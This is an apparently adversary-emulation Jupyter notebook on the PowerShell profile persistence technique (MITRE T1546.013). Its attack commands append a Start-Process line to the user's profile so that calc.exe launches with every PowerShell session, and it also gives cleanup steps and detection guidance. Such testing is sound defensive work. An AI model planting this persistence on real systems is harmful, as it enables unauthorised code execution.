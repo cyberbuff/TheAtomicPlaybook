{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "56ab286c",
   "metadata": {},
   "source": "# T1546.013 - PowerShell Profile\nAdversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts and can be used as a logon script to customize user environments.\n\n[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) \n\nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001) drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001) session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) \n\nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)"
  },
  {
   "cell_type": "markdown",
   "id": "e3152ae3",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "252f5f73",
   "metadata": {},
   "source": "### Atomic Test #1 - Append malicious start-process cmdlet\nAppends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable. Upon execution, calc.exe will be launched.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Ensure a powershell profile exists for the current user\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $profile) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Path $profile -Type File -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1bb1f20d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1546.013 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "a717e904",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nAdd-Content $profile -Value \"\"\nAdd-Content $profile -Value \"Start-Process calc.exe\"\npowershell -Command exit\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8aaa2218",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1546.013 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "c6513a79",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$oldprofile = cat $profile | Select-Object -skiplast 1\nSet-Content $profile -Value $oldprofile\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "233967b7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1546.013 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "8ac9c075",
   "metadata": {},
   "source": "## Detection\nLocations where <code>profile.ps1</code> can be stored should be monitored for new profiles or modifications. (Citation: Malware Archaeology PowerShell Cheat Sheet)(Citation: Microsoft Profiles) Example profile locations (user defaults as well as program-specific) include:\n\n* <code>$PsHome\\Profile.ps1</code>\n* <code>$PsHome\\Microsoft.{HostProgram}_profile.ps1</code>\n* <code>$Home\\\\\\[My ]Documents\\PowerShell\\Profile.ps1</code>\n* <code>$Home\\\\\\[My ]Documents\\PowerShell\\Microsoft.{HostProgram}_profile.ps1</code>\n\nMonitor abnormal PowerShell commands, unusual loading of PowerShell drives or modules, and/or execution of unknown programs."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}